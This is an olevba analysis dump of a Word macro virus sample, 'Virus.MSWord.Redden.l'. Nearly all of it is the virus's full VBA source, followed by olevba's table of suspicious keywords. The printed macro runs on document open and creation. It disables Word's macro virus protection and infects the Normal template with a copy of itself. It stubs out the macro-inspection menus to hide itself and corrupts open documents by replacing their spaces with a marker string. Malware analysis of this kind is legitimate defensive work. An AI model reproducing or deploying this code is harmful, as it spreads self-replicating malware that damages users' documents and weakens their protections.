olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Redden.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Redden.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
11 '
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(4 * Rnd)
If can = 4 Then
 For Each doc In Documents
  ss = doc.Name
  mycheck = ss Like "Äîêóìåíò#**"
  resp = MsgBox("Ðåêîìåíäóåòñÿ coõðàíèòü èçìåíåíèÿ â äîêóìåíòå " & ss + " âî èçáåæàíèå ïîñëåäñòâèé çàâèñàíèÿ êîìï'þòåðà", vbYes + vbInformation + vbDefaultButton1)
  If resp = vbOK Then doc.Save
  If doc.Saved Then
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  With Selection.Find
       .ClearFormatting
       .Replacement.ClearFormatting
       .Text = " "
       .Replacement.Text = "$ÂÄÏÓ$"
       .Forward = True
       .Wrap = wdFindContinue
       .Format = True
       .MatchCase = False
       .MatchWholeWord = False
       .MatchWildcards = False
       .MatchSoundsLike = False
       .MatchAllWordForms = False
       'If .Found = True Then Font.Bold = True
   End With
   Selection.Find.Execute Replace:=wdReplaceAll
   doc.Save
   doc.Close
  End If
 Next doc
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For J = 1 To cou
dest.CodeModule.DeleteLines (1)
Next J
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(i).Name
If aprj = "ÂÄÏÓ" Then already = True
Next i
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "ÂÄÏÓ"
Set nor = NormalTemplate.VBProject.VBComponents("ÂÄÏÓ").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
End If
Phuck:
End Sub

Private Sub Document_New()
'  ÂÄÏÓ
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(4 * Rnd)
can = 4
If can = 4 Then
 For Each doc In Documents
  ss = doc.Name
  mycheck = ss Like "Äîêóìåíò#**"
  resp = MsgBox("Ðåêîìåíäóåòñÿ coõðàíèòü èçìåíåíèÿ â äîêóìåíòå " & ss + " âî èçáåæàíèå ïîñëåäñòâèé çàâèñàíèÿ êîìï'þòåðà", vbYes + vbInformation + vbDefaultButton1)
  If resp = vbOK Then doc.Save
  If doc.Saved Then
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  With Selection.Find
       .ClearFormatting
       .Replacement.ClearFormatting
       .Text = " "
       .Replacement.Text = "$ÂÄÏÓ$"
       .Forward = True
       .Wrap = wdFindContinue
       .Format = True
       .MatchCase = False
       .MatchWholeWord = False
       .MatchWildcards = False
       .MatchSoundsLike = False
       .MatchAllWordForms = False
       'If .Found = True Then Font.Bold = True
   End With
   Selection.Find.Execute Replace:=wdReplaceAll
   doc.Save
   doc.Close
  End If
 Next doc
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For J = 1 To cou
dest.CodeModule.DeleteLines (1)
Next J
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(i).Name
If aprj = "ÂÄÏÓ" Then already = True
Next i
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "ÂÄÏÓ"
Set nor = NormalTemplate.VBProject.VBComponents("ÂÄÏÓ").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
End If
Phuck:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

